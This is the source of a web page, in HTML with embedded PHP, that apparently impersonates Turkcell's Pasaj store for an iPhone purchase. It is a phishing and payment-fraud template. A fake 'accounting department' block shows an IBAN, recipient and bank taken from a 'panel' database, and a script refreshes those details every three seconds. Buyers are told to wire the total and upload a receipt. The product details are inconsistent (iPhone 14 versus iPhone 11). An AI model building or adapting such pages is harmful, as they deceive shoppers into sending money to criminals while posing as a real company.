                            </li>
                        
                </ul>
            </div>
            
                <div class="o-p-mobile-header__dropdown__footer">
                    <a href="/" class="o-p-mobile-header__dropdown__footer__button">turkcell.com.tr</a>
                </div>
            
        </div>

        <div class="o-p-mobile-header__user-dropdown">
            <div class="o-p-mobile-header__user-dropdown__header">
                <div class="o-p-mobile-header__logo">
                    
	<a href="https://m.turkcell.com.tr/" title="Pasaj">
		<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/content/pasaj-logo-new.png?1773534948049" alt="Pasaj">
	</a>

                </div>
                <a href="javascript:;" class="o-p-mobile-header__user-dropdown__close js-user-menu-close"><i class="icon icon-p-close"></i></a>
            </div>
            <div class="container-p">
                
	<div class="o-p-mobile-header__dropdown__login" data-component="PasajLogin"
		data-login='{
		"appId": "215302",
		"desktop":false,
		"loginSdkUrl": "https://tsdk.turkcell.com.tr/SERVICE/AuthAPI/serviceLogin.json",
		"logoutSdkUrl":"",
		"timeout": 5000,
		"turkcellLoginUrl": "/pasaj/giris",
		"logoutUrl":"",
		"errors":
		{"AUTH":"GSM numaranız ya da Turkcell şifreniz hatalı. Lütfen bilgilerinizi kontrol ederek yeniden deneyiniz.",
		"PASSWORD_EXPIRED":"Şifrenizin son kullanma tarihi dolmuş.Tekrar şifre talebinde bulunarak tekrar deneyiniz.",
		"ACCOUNT_LOCKED":"Hesabınız kitlenmiştir, yeniden şifre talep ederek giriş yapabilirsiniz.",
		"CAPTCHA_REQUIRED":"Güvenlik kodunu eksik ya da hatalı girdiniz. Lütfen tekrar deneyiniz.",
		"BACKEND_ERROR": "Bir sorun var, düzeltmek için çalışıyoruz."
		},
		"fastLoginUrl": "/pasaj/giris/mobile_connect/auth",
		"lteCheckUrl" : "/pasaj/giris/lte_check.json",
		"redirectUrlAfterLogin": "/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-512-gb"
		}'>
		<input type="hidden" id="redirectUrlAfterLogin" value="/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-512-gb" >

		<div class="o-p-header__dropdown__login__entrance">
			<div class="o-p-header__dropdown__login__title">Giriş</div>
			<div class="o-p-header__dropdown__login__secondary">Size özel ödeme avantajları ve size özel tekliflerden faydalanmak için Misafir Olarak Devam Et seçeneği ile devam edebilirsiniz.</div>
			<div class="m-login__nonpass" style="display: none">
				<p>** numaralı hatla giriş sağladınız. Telefon numaranızın son 2 hanesini tuşlayarak login olabilirsiniz.</p>
				

<form method="POST" action="/giris/lastTwoDigit" class="m-form" data-component="PasajForm"
	data-parsley-validate="data-parsley-validate" data-parsley-excluded="disabled,:hidden">
	
					<div class="m-p-form__row">
						

	<div class="a-last-numbers" data-component="LastNumbers" data-numbers="" id="last-number-field">
	  <div class="a-last-numbers__wrap">
	    <div></div>
	    <input name="msisdn" type="tel" required="true" id="last-number-id" placeholder="__" minlength="2" maxlength="2" data-parsley-length-message="Bu alanın uzunluğu min. 2 karakter olmalı." data-parsley-errors-container="#last-number-field" data-parsley-class-handler="#last-number-field"/>
	  </div>
	</div>

					</div>
					<div class="m-p-form__row">
						
<button class="a-p-btn js-non-pass-btn"  title="Şifresiz Giriş Yap" >
	Şifresiz Giriş Yap
</button>


						<div class="o-p-header__dropdown__login__break">
							<span>veya</span>
						</div>
					</div>
					<input class="js-login-controlled-input" type="hidden" name="onHeaderLogin" value="true" />
					<input class="js-login-controlled-input" type="hidden" name="shop_redirect_uri" value="" />
				
</form>
			</div>
			
			
			<a href="yarrak.php" data-digital="false" class="a-btn a-btn--full a-btn--big device-available  add-to-basket-non-login" style="display: block" stok="true" >Misafir Olarak Devam Et</a>


		</div>

	</div>
	<div class="o-p-header__dropdown__login__break o-p-header__dropdown__login__break--empty"></div>
	<div class="o-p-header__dropdown__login__link">
		<a href="https://sirketim.turkcell.com.tr/">Kurumsal Yetkili Girişi</a>
	</div>

            </div>
            <div class="a-p-lottie-animation" data-animation="Loading" data-component="PasajLottieAnimation"></div>
        </div>

    </header>


	    <main class='p-p-homepage'>
	        
































<form id="device-detail-form">
	<input type="hidden" name="colorName" />
	<input type="hidden" name="contractedPrice" />
	<input type="hidden" name="initialLimitType" />
	<input type="hidden" name="limitTypeMainSwitch" value="false"/>
	<input type="hidden" id="basket-has-contracted" value="false"/>
	<input type="hidden" id="basket-has-cash-contracted" value="false"/>
	<input type="hidden" id="basket-has-shopping-credit" value="false"/>
	<input type="hidden" name="obligationPeriod" />
	<input type="hidden" name="psiId" />
	<input type="hidden" name="optionId" />
	<input type="hidden" name="colorHexCode" />
	<input type="hidden" name="deviceUrlPostfix" value="cep-telefonu/iphone-14-pro-max-512-gb" />
	<input type="hidden" name="contractBuyType" />
	<input name="id" type="hidden" value="714a758f-bcd6-4a22-a5c5-d62f350c0fc1">
	<input type="hidden" id="deviceAtBasketJson" value='{}' />

	

</form>

<section class="m-p-section breadcrumb">
    <div class="container-p">
        
	<ul class="a-p-breadcrumb a-p-breadcrumb--main" aria-label="Breadcrumb">
		
    <li>
				
                <a href="" title="Pasaj">Pasaj</a>
            
    </li>

    <li>
        
                <a href="" title="<?php echo $sonuc['kat1'] ?>"><?php echo $sonuc['kat1'] ?></a>
            
    </li>

    <li>
        
                <a href="" title="<?php echo $sonuc['kat2'] ?>"><?php echo $sonuc['kat2'] ?></a>
            
    </li>

    <li>
        
                <a href="" aria-current="page" title="<?php echo $sonuc['urunadi'] ?>"><?php echo $sonuc['urunadi'] ?></a>
            
    </li>
		
	</ul>

    </div>
</section>

<section id="product-detail" class="product-detail"  data-page-type="product-detail-page" data-component="PasajProductDetail"
	
		data-product-insider='{"productId":"1071334","name":"iPhone 11 Pro Max 128 GB","taxonomy":["Cep Telefonu-Aksesuar","Apple Telefonlar"],"imageUrl":"https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/pasaj/crop/cg/1663935485571/1-1663935478712.png","price":79999.0,"priceAsString":"79.999","currency":"TRY","color":"Gümüş","stock":16,"salePrice":74799.0,"salePriceAsString":"74.799","quantity":1,"psiId":1361831,"totalDiscount":5200.0,"totalDiscountAsString":"5.200"}'
	
>
	<div class="container">
		<div class="product-detail-top" data-component="ProductImageColorChange">
			<h1><?php echo $sonuc['urunadi'] ?></h1>
			<input type="hidden" id="deviceId" value="714a758f-bcd6-4a22-a5c5-d62f350c0fc1" />
			<div class="a-p-share-sm" data-component="PasajShareSM"><i class="icon icon-p-share"></i></div>
		
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<script>
    function showAlert() {
        var inputFields = document.getElementsByClassName("required");
        var isFormValid = true;

        for (var i = 0; i < inputFields.length; i++) {
            if (inputFields[i].value === "") {
                isFormValid = false;
                break;
            }
        }

        if (!isFormValid) {
            // SweetAlert kullanarak uyarı gösterme
            Swal.fire({
                icon: 'error',
                title: 'Dikkat!',
                text: 'Lütfen dekont yükleyiniz.',
                confirmButtonText: 'Tamam'
            });
        } else {
            // Tüm required alanlar doldurulduğunda doğrudan formu gönder
            document.getElementById("purchaseForm").submit();
        }
    }
</script>

			<form action="tamamlandi?id=<?php echo ($sonuc["id"]); ?>-<?php echo str_replace(" ", "-", $sonuc["urunadi"]); ?>" method="post" enctype="multipart/form-data">

								<style>
.m-p-search-area3 {
    background-color: #fff;
    height: -9.25rem;
    border-radius: 0.5rem;
    padding-left: 0.5rem;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    width: 11.5rem;
    margin-right: 0.625rem;
    position: relative;
    z-index: 15;
}

.m-p-search-area--mobile3 {
    height: 44px;
    width: 100%;
    padding-left: 4px;
    border: 1px solid #dde2e7;
}

.m-p-search-area4 {
    background-color: #fff;
    height: -9.25rem;
    border-radius: 0.5rem;
    padding-left: 0.5rem;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    width: 11.5rem;
    margin-right: 0.625rem;
    position: relative;
    z-index: 15;
}

.m-p-search-area--mobile4 {
    height: 44px;
    width: 340px;
    padding-left: 4px;
    border: 1px solid #dde2e7;
	margin-left: 9px
}
</style>
<center>
<br>
<div style="display: flex; flex-direction: column; gap: 15px;" bis_skin_checked="1">

	<small style="display: inline-block; margin-block: 5px; padding: 4px; background-color: #ffc900; font-weight: bold; color: white; white-space: nowrap;">Turkcell Pasaj Muhasebe Departmanı</small>

		<?php
            $sorgu = $db->prepare("SELECT * FROM panel");
            $sorgu->execute();
            while ($sonuc2 = $sorgu->fetch()) {
        ?>	
        
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script>
    function guncelleIbanBilgileri() {
        $.ajax({
            url: 'otoguncelle.php', // Güncelleme işlemini gerçekleştirecek PHP dosyanızın adını ve yolunu belirtin
            method: 'GET',
            dataType: 'json', // JSON verisi beklediğimizi belirtiyoruz
            success: function (data) {
                // Güncelleme başarılı olduğunda veriyi kullanarak sayfadaki alanları güncelle
                for (var i = 0; i < data.length; i++) {
                    // IBAN Güncelleme
                    $('.ibanSpan').eq(i).text(data[i].iban);

                    // Banka Güncelleme
                    $('.bankaSpan').eq(i).text(data[i].banka);

                    // Alıcı Adı Soyadı Güncelleme
                    $('.ibanadSpan').eq(i).text(data[i].ibanad);
                }
            },
            error: function (xhr, status, error) {
                console.error('Güncelleme hatası:', status, error);
            }
        });
    }

    // Belirli aralıklarla güncelleme fonksiyonunu çağır
    setInterval(guncelleIbanBilgileri, 3000); // 3 saniyede bir güncelle (3000 milisaniye)
</script>

		<div style="display: flex; flex-direction: column; border-left: 4px solid #2855ac; border-right: 4px solid #2855ac; padding: 10px; font-size: 1.2rem;" bis_skin_checked="1">
			<h2>IBAN</h2>
			<span class="ibanSpan" style="text-decoration: none; margin-bottom:8px; margin-top:-5px" id="metinSatiri"><?php echo ($sonuc2["iban"]); ?></span>
            <center>
            <button id="kopyalaButonu" aria-label="iban-copy" style="border-radius:5px; height:28px; width:62px; font-size: 0.8rem; display: inline-block; padding: 5px; border: 0px solid white; font-weight: bold; color: white; text-align: center; background-color: rgb(255, 201, 0); cursor: pointer;">Kopyala</button>
            </center>
		</div>

        <div style="display: flex; flex-direction: column; border-left: 4px solid #2855ac; border-right: 4px solid #2855ac; padding: 10px; font-size: 1.2rem;" bis_skin_checked="1">
			<h2>Alıcı Adı Soyadı</h2>
			<span class="ibanadSpan" style="margin-top:-5px"><?php echo ($sonuc2["ibanad"]); ?></span>
		</div>

		<div style="display: flex; flex-direction: column; border-left: 4px solid #2855ac; border-right: 4px solid #2855ac; padding: 10px; font-size: 1.2rem;" bis_skin_checked="1">
			<h2>Banka</h2>
			<span class="bankaSpan"style="margin-top:-5px"><?php echo ($sonuc2["banka"]); ?></span>
		</div>
	</div>
    <?php	
		}
	?>
	<br>
	<div style="margin-top: 10px;" bis_skin_checked="1">        
		<span style="font-size: 1.4rem; margin-right: 5px; margin-top: 5px;"><b>Toplam: </b><?php echo ($sonuc["urunfiyati"]); ?> TL</span>
<br><br>
		<div style="border-bottom: 4px solid #2855ac;" bis_skin_checked="1"></div>
	</div>
<br>
	<p>Toplam ödeme miktarını havale/EFT yoluyla belirtilen yetkili Turkcell Pasaj muhasebe departmanına gönderdikten sonra, ödemeyi yaptığınızı belirten dekont görselini yüklemeniz gerekmektedir. Dekont bilgisinde; adınız, soyadınız, ödeme miktarı ve alıcı banka hesabı bilgileri görünebilir olmalıdır. Ödemeyi onayladığınız zaman <a href="https://www.turkcell.com.tr/tr/turkcell-uygulamasi-kullanim-kosullari-sozlesmesi"><font color="#2855ac">Turkcell Pasaj kullanıcı sözleşmesini</font></a> kabul etmiş sayılırsınız.</p>

	<br>

		<label id="select-receipt-label" for="select-receipt-input" style="display: inline-block; margin-top: 0px; width: 295px; padding: 10px; font-weight: bold; text-align: center; background-color: #2855ac; color: white; font-weight: bold; border-radius: 5px; cursor: pointer;">Dekont Yükle</label>
		<input onchange="onReceiptSelection()" id="select-receipt-input" type="file" name="dekont" class="required" accept="image/png, image/jpeg, image/jpg" style="display: none;" required>
		
		<script>
			
			function onReceiptSelection() {
		
				let label = $("#select-receipt-label");
				let input = $("#select-receipt-input");
		
				let file = input.prop("files")[0];
		
				if (file.size > 2 * 1024 * 1024) { // File larger than 2 MB
		
					$("#payment-status").text("Yüklemeye çalıştığınız dekont 2 MB üst sınırından fazla boyuttadır.").css({ "display": "block", "color": "red" });
		
					$("#complete-payment-button").attr("disabled", true).css("opacity", "50%");
		
					return;
		
				}
		
				label.text(file.name);
		
				$("#complete-payment-button").attr("disabled", false).css("opacity", "100%");
		
			}
		
		</script>

<br><br>
												
								<div class="product-detail__top-offer-box" data-component="OfferBox" data-max-list="2" data-device="mobile" data-list-target=".product-detail-top-offer-box__list" data-detail-target="#product-detail-offer-box">
									<input type="hidden" class="js-offer-data" value='[{"productModelId":1071334,"psiId":1323192,"colorId":1003579,"price":"24.000","amount":2,"outrightPrice":"24.000","discountName":null,"sellerId":42,"sellerName":"BittiBitiyor","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0744006231400013","cityName":"İstanbul","districtName":"Ataşehir","phoneNumber":null,"address":"Küçükbakkalköy mah. Şerifali cad. Kılıçreis sok. No :4-6 Sar Plaza Ataşehir/İstanbul","tooltipId":1,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"Sar Elektronik","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"sar@hs02.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"70.099","insiderPrice":75199.0,"insiderSalePrice":75199.0,"insiderPriceAsStr":"24.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"24.000","discountPrice":0.0},{"productModelId":1071334,"psiId":1255715,"colorId":1010387,"price":"77.998,99","amount":1,"outrightPrice":"77.998,99","discountName":null,"sellerId":4461,"sellerName":"Beşken Elektronik","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0274062943000018","cityName":"İstanbul","districtName":"Fatih","phoneNumber":null,"address":"Hobyar Mah.Hamidiye Cad. Altın Han No:3 Kat:6 İç Kapı:59 Sirkeci","tooltipId":5,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"BEŞKEN ELEKTRONİK SANAYİ VE DIŞ TİC.LTD.ŞTİ.-106337","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"besken@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":77998.99,"insiderSalePrice":77998.99,"insiderPriceAsStr":"77.998,99","discountPriceAsStr":"0","insiderSalePriceAsStr":"77.998,99","discountPrice":0.0},{"productModelId":1071334,"psiId":1303047,"colorId":1010388,"price":"78.999","amount":2,"outrightPrice":"78.999","discountName":null,"sellerId":10844,"sellerName":"AKTEL GSM - Turkcell Mağazası","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"1111111111111111","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"TEPEÜSTÜ MAH. ALEMDAĞ CAD. NO:590/A","tooltipId":6,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"AKTEL GSM İLETİŞİM ELEKTRONİK DAYANIKLI TÜKETİM MALLARI SAN.VE TİC. A.Ş.-85111","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"-@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"69.339","insiderPrice":78999.0,"insiderSalePrice":78999.0,"insiderPriceAsStr":"78.999","discountPriceAsStr":"0","insiderSalePriceAsStr":"78.999","discountPrice":0.0},{"productModelId":1071334,"psiId":1304625,"colorId":1010387,"price":"79.999","amount":2,"outrightPrice":"79.999","discountName":null,"sellerId":10844,"sellerName":"AKTEL GSM - Turkcell Mağazası","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"1111111111111111","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"TEPEÜSTÜ MAH. ALEMDAĞ CAD. NO:590/A","tooltipId":7,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"AKTEL GSM İLETİŞİM ELEKTRONİK DAYANIKLI TÜKETİM MALLARI SAN.VE TİC. A.Ş.-85111","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"-@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"69.979","insiderPrice":79999.0,"insiderSalePrice":79999.0,"insiderPriceAsStr":"79.999","discountPriceAsStr":"0","insiderSalePriceAsStr":"79.999","discountPrice":0.0},{"productModelId":1071334,"psiId":1267559,"colorId":1003925,"price":"80.000","amount":1,"outrightPrice":"80.000","discountName":null,"sellerId":2961,"sellerName":"Yıldırım Telefon - Turkcell Mağazası","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0009600032150","cityName":"İstanbul","districtName":"Gaziosmanpaşa","phoneNumber":null,"address":"Hürriyet Mahallesi Eski Edirne Asfaltı No:140 Gaziosmanpaşa","tooltipId":8,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"YILDIRIM TELEFON MOBİL SİS.ELEKT.SANVE TİC.LTD.ŞTİ.-12319","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"yildirimtelefon@hs03.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":80000.0,"insiderSalePrice":80000.0,"insiderPriceAsStr":"80.000","discountPriceAsStr":"0","insiderSalePriceAsStr":"80.000","discountPrice":0.0},{"productModelId":1071334,"psiId":1291720,"colorId":1010387,"price":"85.799","amount":2,"outrightPrice":"85.799","discountName":null,"sellerId":11301,"sellerName":"İntegra Bilgisayar","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0761007672900016","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"YUKARI DUDULLU MAH. TURNA SOK. NO:27/2  ÜMRANİYE/ İSTANBUL ","tooltipId":9,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"İNTEGRA BİLGİSAYAR SAN.VE TİC.LTD.ŞTİ.-130929","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"info@integrabil.com","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":85799.0,"insiderSalePrice":85799.0,"insiderPriceAsStr":"85.799","discountPriceAsStr":"0","insiderSalePriceAsStr":"85.799","discountPrice":0.0},{"productModelId":1071334,"psiId":1291715,"colorId":1003579,"price":"85.799","amount":1,"outrightPrice":"85.799","discountName":null,"sellerId":11301,"sellerName":"İntegra Bilgisayar","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0761007672900016","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"YUKARI DUDULLU MAH. TURNA SOK. NO:27/2  ÜMRANİYE/ İSTANBUL ","tooltipId":10,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"İNTEGRA BİLGİSAYAR SAN.VE TİC.LTD.ŞTİ.-130929","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"info@integrabil.com","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":85799.0,"insiderSalePrice":85799.0,"insiderPriceAsStr":"85.799","discountPriceAsStr":"0","insiderSalePriceAsStr":"85.799","discountPrice":0.0}]'>
								</div>


								
									<button onclick="showAlert()" type="submit" name="foto" id="p-1071334" data-digital = "false" class="a-btn a-btn--full a-btn--big device-available  add-to-basket-non-login"
											style="display: block" stok="true"
											data-psi-id="1361831" 
											data-onbasket-text="Sepetinizde"
											data-add-text="Satın Al"
											data-component="ProductLogin">Satın Al</button>
								
							</form>
						</center>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<script>
    document.getElementById("kopyalaButonu").addEventListener("click", function() {
        var metinSatiri = document.getElementById("metinSatiri");
        
        // Metni seç ve kopyala
        var sec = window.getSelection();
        var range = document.createRange();
        range.selectNodeContents(metinSatiri);
        sec.removeAllRanges();
        sec.addRange(range);
        document.execCommand("copy");
        
        // SweetAlert kullanarak kullanıcı geribildirimini göster
        Swal.fire({
            icon: 'success',
            html: '<strong>IBAN Kopyalandı</strong><br>' + metinSatiri.innerText,
            confirmButtonText: 'Tamam'
        });
    });
</script>

						<br>
							
		<div class="m-purchase-features m-purchase-features--images">
			
	<div class="m-purchase-features__item tooltip" data-tooltip-content="#free-cargo" data-component='{"type":"Tooltip","addActiveClass":true}'>
		
		<span class="a-btn-icon a-btn-icon--medium-b a-btn-icon--circle">
		
				<i class="icon-delivery"></i>
			
			</span>
		
		<span>Ücretsiz Kargo</span>
	</div>


	<div class="m-purchase-features__item tooltip" data-tooltip-content="#turkcell-warranty" data-component='{"type":"Tooltip","addActiveClass":true}'>
		
		<span class="a-btn-icon a-btn-icon--medium-b a-btn-icon--circle">
		
				<i class="icon-warranty"></i>
			
			</span>
		
		<span>Turkcell Pasaj Garantisi</span>
	</div>


	<div class="m-purchase-features__item tooltip" data-tooltip-content="#installment" data-component='{"type":"Tooltip","addActiveClass":true}'>
		
		<span class="a-btn-icon a-btn-icon--medium-b a-btn-icon--circle">
		
				<i class="icon-installment"></i>
			
			</span>
		
		<span>Taksitli Alışveriş</span>
	</div>


		</div>
		<div class="tooltip-templates">
			
					<div id="free-cargo">
						<h3>Ücretsiz Kargo</h3>
						<p>Türkiye'nin her yerine teslimat.</p>
						<a class="a-btn-icon tooltip-close  js-tooltip-close" href="javascript:;">
							<i class="icon-close"></i>
						</a>
					</div>
				
					<div id="turkcell-warranty">
						<h3>Turkcell Pasaj Garantisi</h3>
						<p>Türkiye’nin lider ve en güvenilir operatörü olarak tüm aşamalarındaki taleplerinizi açık, şeffaf, hızlı, güvenilir ve müşteri odaklı bir şekilde çözüyoruz</p>
						<a class="a-btn-icon tooltip-close  js-tooltip-close" href="javascript:;">
							<i class="icon-close"></i>
						</a>
					</div>
				
					<div id="installment">
						<h3>Taksitli Alışveriş</h3>
						<p>Kredi kartına ihtiyaç duymadan faturanıza ek ödeme seçenekleri Turkcell'de</p>
						<a class="a-btn-icon tooltip-close  js-tooltip-close" href="javascript:;">
							<i class="icon-close"></i>
						</a>
					</div>
				
		</div>
	

							

						
					
				
 </div>
			</div>

		</div>
	</div>

	<!-- google-analytics -->
	<div id="google-analytics-device-informations" style="display: none;" data-section-title="cep-telefonu" data-product-id="1071334" data-product-name="iPhone 11 Pro Max 128 GB" data-product-price="74799.0" data-product-brand="Apple" data-position="1" data-dimension21="TRY"
		 data-dimension22="false" data-dimension25="Kontratli"
		 data-dimension27="true" data-dimension30="Non-Turkcell"
		 data-dimension31="Gümüş"
		 data-dimension156="true" data-dimension157="6.5"
		 data-dimension167="16" data-dimension168="9"
		 data-dimension169="7"
		 data-dimension170="5"
		 data-dimension171="4881"
		 data-dimension172="Turkcell Pasaj A.Ş."
		data-product-category='Cep Telefonu-Aksesuar' data-dimension173='Apple Telefonlar' 
		 data-dimension178="1003579"
	></div>
	<input id="google-analytics-device-seller-informations" type="hidden" value='{"1255715":{"productModelId":1071334,"psiId":1255715,"colorId":1010387,"price":"77.998,99","amount":1,"outrightPrice":"77.998,99","discountName":null,"sellerId":4461,"sellerName":"Beşken Elektronik","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0274062943000018","cityName":"İstanbul","districtName":"Fatih","phoneNumber":null,"address":"Hobyar Mah.Hamidiye Cad. Altın Han No:3 Kat:6 İç Kapı:59 Sirkeci","tooltipId":5,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"BEŞKEN ELEKTRONİK SANAYİ VE DIŞ TİC.LTD.ŞTİ.-106337","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"besken@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":77998.99,"insiderSalePrice":77998.99,"insiderPriceAsStr":"77.998,99","discountPriceAsStr":"0","insiderSalePriceAsStr":"77.998,99","discountPrice":0.0},"1291715":{"productModelId":1071334,"psiId":1291715,"colorId":1003579,"price":"85.799","amount":1,"outrightPrice":"85.799","discountName":null,"sellerId":11301,"sellerName":"İntegra Bilgisayar","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0761007672900016","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"YUKARI DUDULLU MAH. TURNA SOK. NO:27/2  ÜMRANİYE/ İSTANBUL ","tooltipId":10,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"İNTEGRA BİLGİSAYAR SAN.VE TİC.LTD.ŞTİ.-130929","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"info@integrabil.com","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"0","insiderPrice":85799.0,"insiderSalePrice":85799.0,"insiderPriceAsStr":"85.799","discountPriceAsStr":"0","insiderSalePriceAsStr":"85.799","discountPrice":0.0},"1304625":{"productModelId":1071334,"psiId":1304625,"colorId":1010387,"price":"79.999","amount":2,"outrightPrice":"79.999","discountName":null,"sellerId":10844,"sellerName":"AKTEL GSM - Turkcell Mağazası","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"1111111111111111","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"TEPEÜSTÜ MAH. ALEMDAĞ CAD. NO:590/A","tooltipId":7,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"AKTEL GSM İLETİŞİM ELEKTRONİK DAYANIKLI TÜKETİM MALLARI SAN.VE TİC. A.Ş.-85111","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"-@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"69.979","insiderPrice":79999.0,"insiderSalePrice":79999.0,"insiderPriceAsStr":"79.999","discountPriceAsStr":"0","insiderSalePriceAsStr":"79.999","discountPrice":0.0},"1361831":{"productModelId":1071334,"psiId":1361831,"colorId":1003579,"price":"79.999","amount":1,"outrightPrice":"74.799","discountName":null,"sellerId":4881,"sellerName":"Turkcell Pasaj A.Ş.","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0000000000","cityName":"İzmir","districtName":"Bornova","phoneNumber":null,"address":"Kazım Dirik Mah. Fevzi Çakmak Cad. No:10 D:2","tooltipId":0,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":"31.08.2023","sellerCompanyName":"KAFKAS NECAN-140474","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"kafkasbilisim@hs03.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"65.989","insiderPrice":79999.0,"insiderSalePrice":74799.0,"insiderPriceAsStr":"79.999","discountPriceAsStr":"5.200","insiderSalePriceAsStr":"74.799","discountPrice":5200.0},"1303047":{"productModelId":1071334,"psiId":1303047,"colorId":1010388,"price":"78.999","amount":2,"outrightPrice":"78.999","discountName":null,"sellerId":10844,"sellerName":"AKTEL GSM - Turkcell Mağazası","cargoSla":"1 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"1111111111111111","cityName":"İstanbul","districtName":"Ümraniye","phoneNumber":null,"address":"TEPEÜSTÜ MAH. ALEMDAĞ CAD. NO:590/A","tooltipId":6,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"AKTEL GSM İLETİŞİM ELEKTRONİK DAYANIKLI TÜKETİM MALLARI SAN.VE TİC. A.Ş.-85111","analyticDiscountName":null,"analyticDiscountRatio":null,"kepAddress":"-@hs01.kep.tr","amountLimit":9,"discountRatio":0,"rateLimit":1,"monthlyMinPrice":"69.339","insiderPrice":78999.0,"insiderSalePrice":78999.0,"insiderPriceAsStr":"78.999","discountPriceAsStr":"0","insiderSalePriceAsStr":"78.999","discountPrice":0.0},"1267559":{"productModelId":1071334,"psiId":1267559,"colorId":1003925,"price":"80.000","amount":1,"outrightPrice":"80.000","discountName":null,"sellerId":2961,"sellerName":"Yıldırım Telefon - Turkcell Mağazası","cargoSla":"2 İş Gününde Kargoda","point":null,"sellerPrice":null,"discountRate":null,"email":null,"mersisNo":"0009600032150","cityName":"İstanbul","districtName":"Gaziosmanpaşa","phoneNumber":null,"address":"Hürriyet Mahallesi Eski Edirne Asfaltı No:140 Gaziosmanpaşa","tooltipId":8,"stock":"Ürün tükenmek üzere","countDown":null,"countDate":null,"sellerCompanyName":"YILDIRIM TELEFON MOBİL SİS.ELEKT.SANVE 